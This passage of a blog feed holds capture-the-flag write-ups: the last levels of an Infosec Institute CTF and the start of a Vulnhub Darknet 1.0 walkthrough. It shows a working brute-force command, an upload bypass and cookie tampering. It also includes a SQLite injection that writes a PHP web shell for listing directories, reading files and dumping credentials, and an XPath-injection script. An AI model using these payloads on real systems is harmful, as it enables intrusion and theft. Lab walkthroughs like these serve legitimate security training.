&lt;p&gt;I make a note of this.&lt;/p&gt;

&lt;p&gt;Now can I just upload an html file? That gives me an error of an invalid file type. So let me chack
if it&amp;rsquo;s just checking the extension or if there&amp;rsquo;s something more happening. Intercepting the upload
request with Burp proxy I can change the extension to &lt;code&gt;jpg&lt;/code&gt; and sucessfully upload the html file.&lt;/p&gt;

&lt;p&gt;Now browsing to the image url I am told it cannot display the image due to errors. Well, the browser
is trying to interpret the file as an image, which it clearly isn&amp;rsquo;t. There&amp;rsquo;s got to be another way
to get at my image. How about the object reference in the URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/code&gt;
for example? Maybe if I just reference the filename directly?&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=index.jpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Success&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/RVoJGMr.png&#34;&gt;{ %img http://i.imgur.com/RVoJGMr.png %}&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-09:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 09&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php&#34;&gt;Level 09&lt;/a&gt; starts off by showing me the
details of one John Doe.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8NESmpB.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I need to change something to make it show the details for Mary Jane. There&amp;rsquo;s no URL parms,
no login, so how can the page know who to show? There&amp;rsquo;s one place left: the cookie jar.&lt;/p&gt;

&lt;p&gt;Using Firebug once again I inspect the cookies and sure enough&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGdtDa7.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is &amp;ldquo;JOHN+DOE&amp;rdquo; encoded as base64 as it turns out. One thing to note is when you&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;echo Sk9ITitET0u= | base64 -d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;there is no newline at end of the name. So to encode &lt;code&gt;MARY+JANE&lt;/code&gt; correctly I need to
use echo with the &lt;code&gt;-n&lt;/code&gt; flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; -n MARY+JANE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64
TUFSWStKQU5F
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Editing the cookie and inserting that base64 string will show us Mary Jane&amp;rsquo;s details.&lt;/p&gt;

&lt;h1 id=&#34;level-10:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 10&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php&#34;&gt;Level 10&lt;/a&gt; is a game and we need to
edit its source so we look like we&amp;rsquo;re really good at it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/g03njlQ.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Entering anything in the name I field I have a poke around to see how the whole thing
works. We&amp;rsquo;re shown some coloured squares and then they are turn over. We need to then
remember which colour each square had. Except we need to do it at least 9999 times and
at the extreme level, which only shows us the squares for a second.&lt;/p&gt;

&lt;p&gt;Finding the square colours isn&amp;rsquo;t hard. With Firebug we can see:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/isDO7LM.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;and those numbers are 0 indexed into the list of numbers from the selction popup. So playing
along I can win one game. So let&amp;rsquo;s find out where my current win/loss count is stored.&lt;/p&gt;

&lt;p&gt;In the Javscript I find a structure that does this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/gZghIIn.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;but all this does is increment and decrement the values. Clearly that data is stored somewhere.
Turns out that this &lt;code&gt;localstorage&lt;/code&gt; is in the DOM. Using the &lt;em&gt;DOM&lt;/em&gt; tab in Firebug I can find
the structure and its data:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGIZXpb.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now I can edit the number of wins and then, all I need to do is play one more game to take the flag.&lt;/p&gt;

&lt;h1 id=&#34;level-11:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 11&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex11.php&#34;&gt;Level 11&lt;/a&gt; blacklists me&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/RaGy98O.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Awwwww I was having such fun. But how? Not from my IP, as that&amp;rsquo;s going to change. First thing
to check: cookie jar. Yay!&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QgGrvwE.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;There it is, a big &lt;code&gt;no&lt;/code&gt;. I&amp;rsquo;ll change that to a &lt;code&gt;yes&lt;/code&gt;, reload and take the flag, thanks very much.&lt;/p&gt;

&lt;h1 id=&#34;level-12:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 12&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&#34;&gt;Level 12&lt;/a&gt; is a bruteforce challange. No
login attempt limits, no rate limits, so it&amp;rsquo;s ripe for the picking.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/LMUBNoq.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;After searching for the suggested password list, the first hit is the Openwall password list for
john the ripper. So why not download it and give it a try?&lt;/p&gt;

&lt;p&gt;I fire up &lt;code&gt;wfuzz&lt;/code&gt; with the following commandline&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; wfuzz -c -z file,/usr/share/wordlists/password-2011.lst --hw Incorrect -d &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;username=admin&amp;amp;password=FUZZ&amp;amp;logIn=Login&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Within a few seconds I get a hit with &lt;code&gt;princess&lt;/code&gt;. Enter that with the username &lt;code&gt;admin&lt;/code&gt; and onto the next level&lt;/p&gt;

&lt;h1 id=&#34;level-13:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 13&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=ex13-task.php&#34;&gt;Level 13&lt;/a&gt; is actually
redirect to &lt;code&gt;ex13-task.php&lt;/code&gt;. I need to make the redirect point to an external page so that to another user
it looks like they are visiting &lt;code&gt;ctf.infosecinstitute.com&lt;/code&gt; but are infact taken to another site&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jNgQ4Ww.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Well the obvious thing is just to try and type in another URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk&lt;/code&gt;
but that gives me an error. Hrmm&amp;hellip; trying a few other redirect options tells me that the redirect is URL
relative, which means if I strip off the protocol off the URL, I should be able to make this work:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QM7V8Dk.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QM7V8Dk.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sure enough, that worked. That&amp;rsquo;s it, the final flag.&lt;/p&gt;

&lt;p&gt;Thanks to the Infosec Institute for another great CTF!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub Darknet1.0 write up</title>
      <link>https://svenito.github.io/nowhere/2015/06/08/vulnhub-darknet1-dot-0-write-up/</link>
      <pubDate>Mon, 08 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/06/08/vulnhub-darknet1-dot-0-write-up/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/darknet-10,120/&#34;&gt;Darknet 1.0&lt;/a&gt; by &lt;a href=&#34;https://www.vulnhub.com/author/q3rv0,111/&#34;&gt;q3rv0&lt;/a&gt;
isn&amp;rsquo;t easy&amp;hellip; for me anyway.&lt;/p&gt;

&lt;p&gt;With some help and lots of reading I did however get to the bottom of it.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s my journey&lt;/p&gt;

&lt;h1 id=&#34;stage-1:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 1&lt;/h1&gt;

&lt;p&gt;First things first: scan the target&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV -p- 192.168.56.106

Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-03 12:57 BST
Nmap scan report for darknet.com (192.168.56.106)
Host is up (0.00017s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
57664/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:E5:9F:EC (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 second
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Not much to be had here other than a web server. Poking at the RPC ports
didn&amp;rsquo;t give any results. Browsing to the IP shows me:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/b513tfj.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;There&amp;rsquo;s no &lt;code&gt;robots.txt&lt;/code&gt; so nothing left to do but run &lt;code&gt;dirbuster&lt;/code&gt; on it. Using the
&lt;code&gt;directory-list-2.3-medium.txt&lt;/code&gt; I&amp;rsquo;m rewarded with some directories and files that
might be of interest&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/dNQnSQy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I downloaded the &lt;code&gt;888.darknet.com.backup&lt;/code&gt; file and took a look at it.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&amp;lt;/VirtualHost&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm.. a virtual host configuration. I added &lt;code&gt;192.168.56.106 888.darknet.com&lt;/code&gt; to my local &lt;code&gt;/etc/hosts&lt;/code&gt;
and then pointed my browser to &lt;code&gt;888.darknet.com&lt;/code&gt; to be presented with this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/PcMHBLd.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Initial thoughts are SQLi, so  I started with some simple SQL injections to see
if my hunch is correct. Entering a username like &lt;code&gt;&#39; or &#39;1&#39;=&#39;1&lt;/code&gt;
yields an &lt;em&gt;Ilegal&lt;/em&gt;[sic] message. So this means two things: 1) SQLi is very
probably here becasue 2) our input is filtered. I didn&amp;rsquo;t fancy working out
what chars I can and can&amp;rsquo;t use so I made a script to do that for me&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;testit&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(c):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;http://888.darknet.com/index.php&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;username=%s&amp;amp;password=%s&amp;amp;Action=Login&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(c,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c)&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;post(url,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;search(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;.*Ilegal.*&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;text)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m:&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;Illegal&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt; OK&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;punctuation:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;testit(c)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which yielded the following as illegal characters.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;,	Illegal
-	Illegal
;	Illegal
&amp;lt;	Illegal
=	Illegal
&amp;gt;	Illegal
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;everything else was fair game. Well almost everything, some SQL commands aren&amp;rsquo;t
allowed either. But I&amp;rsquo;ve got enough to work with.
I have a good idea that &lt;code&gt;devnull&lt;/code&gt; is a valid user, so I&amp;rsquo;ll try to use that
info. I enter &lt;code&gt;devnull&#39;/*&lt;/code&gt; as a username hoping I am creating a query like
&lt;code&gt;SELECT * FROM users WHERE username=&#39;devnull&#39;/* AND password=&#39;xxxx&#39;;&lt;/code&gt;. Hitting
the login button confirms my input is correct.&lt;/p&gt;

&lt;p&gt;I should mention here that the VM has a bug in it so that even if you get the sqli
right, it will redirect you back to &lt;code&gt;index.php&lt;/code&gt;.  Noticed this in Burp as it
was redirection to &lt;code&gt;main.php&lt;/code&gt; after the correct SQLi, but then
going back to &lt;code&gt;index.php&lt;/code&gt;. A full reinstall of the VM will fix this, or reverting to
an earlier snapshot will also work.&lt;/p&gt;

&lt;p&gt;Ok, so now I get&lt;/p&gt;

&lt;h1 id=&#34;stage-2:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 2&lt;/h1&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/joaBvqT.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Whatever I enter here just goes somewhere without any feedback. This is completely blind
and will be a bit of a challenge.&lt;/p&gt;

&lt;p&gt;While I was unaware of the bug I mentioned earier, I ended up entering a lot of different characters into the
login form. An interesting response comes when you enter &lt;code&gt;&#39;&lt;/code&gt; for the username with any pass:
&lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;. This is the md5 of the password.
Using a number like &lt;code&gt;1&lt;/code&gt; for the password with &lt;code&gt;&#39;&lt;/code&gt; as the username gives
this error &lt;code&gt;near &amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot;: syntax error&lt;/code&gt;
These errors indicate that this is in fact a SQLite DB. This information will help me with the admin console
as I now know what I am working with. This also confirms my earlier suspicion about what the query looks
like.&lt;/p&gt;

&lt;p&gt;One useful feature of SQLite that I can exploit in this case, is its ability to create files on disk.
To leverage this, I need to find is a folder where I have permission to write files to.
I ran &lt;code&gt;dirbuster&lt;/code&gt; again and now have a few directories to try&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/zlFz06Y.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;In order to create a file with SQLite I need to attach the file in question as a database.
So I set about running commands like this&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;attach database &amp;#39;/home/devnull/public_html/test.php&amp;#39; as db;                
drop table if exists db.test;                                                    
create table db.test(payload text);                                              
insert into db.test(payload) values(&amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From the Apache config I downloaded at the start, I know that the webroot is &lt;code&gt;/home/devnull/public_html&lt;/code&gt;,
so any directories I got back from dirbuster will be a subdirectory of that.
I try all the folders until I got a hit with the &lt;code&gt;img&lt;/code&gt; directory. So I&amp;rsquo;ve got a place to
create files, but the bad news is that &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;eval&lt;/code&gt;, and its ilk are disabled.
This means no simple php shell. Boooo.&lt;/p&gt;

&lt;p&gt;Not to worry, I got this. I knocked up a quick PHP script to do some work for me&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;db&amp;quot;) {                                                     
    $dbhandler=new SQLite3(&amp;quot;/home/devnull/database/888-darknet.db&amp;quot;);            
                                                                                
    $query = $dbhandler-&amp;gt;query(&amp;quot;SELECT * FROM login&amp;quot;);                          
                                                                                
    while($result=$query-&amp;gt;fetchArray()){                                        
        print_r($result);                                                       
        print &amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;                                                          
    }                                                                           
}                                                                               
                                                                                
if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;ls&amp;quot;) {                                                     
    $path = $_GET[&amp;quot;arg&amp;quot;];                                                       
    @chdir($path);                                                              
    $dir = @dir($path);                                                         
    while($d = $dir-&amp;gt;read()) {                                                  
        print $d.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;                                                       
    }                                                                           
}                                                                               
if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;cat&amp;quot;) {                                                    
    $file = $_GET[&amp;quot;arg&amp;quot;];                                                       
    $fh = fopen($file, &amp;quot;r&amp;quot;);                                                    
    if ($fh) {                                                                  
        while ($l = fgets($fh)) {                                               
            print htmlspecialchars($l).&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;                                 
        }                                                                       
        fclose($fh);                                                            
    } else { print &amp;quot;Cannot open &amp;quot;.$file.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;; }                              
} 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I use this as the payload in the &lt;code&gt;INSERT&lt;/code&gt; statement.&lt;/p&gt;

&lt;p&gt;With the &lt;code&gt;cmd&lt;/code&gt; parameter I can now list directories and cat files. The database
details were added once I had got the details from the db file in the &lt;code&gt;includes&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;I scoped around the server a bit, looking in the usual interesting folders, seeing if there&amp;rsquo;s
anything useful. Eventually I found something interesting in the Apache
config folder. There&amp;rsquo;s another virtual host on this machine at &lt;code&gt;signal8.darknet.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Before I go on, I best mention &lt;a href=&#34;https://github.com/dotcppfile/DAws&#34;&gt;DAws&lt;/a&gt; which
will make your life super easy. I crafted a file uploader in PHP which I put on the
server with the SQL admin trick above, and then uploaded the &lt;code&gt;DAws.php&lt;/code&gt; file. This
will drop a &lt;code&gt;php.ini&lt;/code&gt; on the server that allows you to run commands, and also create
a reverse shell to your host. &lt;strong&gt;Much&lt;/strong&gt; easier than what I did, but you learn new things
all the time. This will be the PHP script I&amp;rsquo;ll be using going forward.&lt;/p&gt;

&lt;h1 id=&#34;stage-3:3817275722f75303351ad52bb23d8c3d&#34;&gt;Stage 3&lt;/h1&gt;

&lt;p&gt;Ok, so now I&amp;rsquo;m looking at the list of Darknet staff. Clicking on the usernames will take
me to a php page showing me that user&amp;rsquo;s email. While I ponder the significance of this
I check for a robots.txt file and this time there is one. It lists a directory
called &lt;code&gt;xpanel&lt;/code&gt; which prompts me for another username and password combo.
No SQLi here though I&amp;rsquo;m afraid. I cannot bruteforce this either. Well I &lt;em&gt;could&lt;/em&gt;
but I don&amp;rsquo;t think I&amp;rsquo;ll get a hit any time soon.&lt;/p&gt;

&lt;p&gt;Fastforward and I&amp;rsquo;m stuck. After chatting to &lt;em&gt;g0blin&lt;/em&gt; I get a hint that the &lt;code&gt;contact.php&lt;/code&gt; is
a key. I start attempting to inject stuff into the &lt;code&gt;id&lt;/code&gt; field. Eventually I notice that I am
not looking at the same DB. The ids don&amp;rsquo;t match with what I saw before when I dumped the DB.
This is a new data store. But what is it?
SQL wasn&amp;rsquo;t getting me anywhere so I leafed through books and notes and figured it could be
XML. If it is, it will most likely be something like &lt;code&gt;...user/id=1]&lt;/code&gt; Adding &lt;code&gt;][1&lt;/code&gt; at the end will
return the first and only result, and we should get the email as per normal.
Adding &lt;code&gt;[2&lt;/code&gt; will error and return nothing as there should only be one result. If this works
I can be fairly certain that this is an XPath query.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/7jRrIo0.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Excellent, it worked. Now I need to figure out how to make use of this. XPath isn&amp;rsquo;t
something I&amp;rsquo;ve come across very often.&lt;/p&gt;

&lt;p&gt;So I begin to experiment. First off I figured out if it&amp;rsquo;s XPath V2 or XPath V1.
If entering &lt;code&gt;id=1 or count(//*)][1&lt;/code&gt; doesn&amp;rsquo;t work, but &lt;code&gt;id=1 lower-case(&#39;A&#39;)][1&lt;/code&gt; does,
then it&amp;rsquo;s XPath V2, otherwise it&amp;rsquo;s XPath V1.&lt;/p&gt;

&lt;p&gt;While I played around with this something clicked in my head and I groked enough of XPi
(XPath injection) to get to the bottom of this. Using the truth from above we can
determine the xpath names using the &lt;code&gt;substring&lt;/code&gt; function. I wrote another python
script to do the heavy lifting&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;requests&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;


&lt;span style=&#34;color: #f8f8f2&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;URL&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;http://signal8.darknet.com/contact.php&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;payload_tpl&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;1 and substring(name(%s),%d,1)=&amp;#39;%s&amp;#39;][1&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
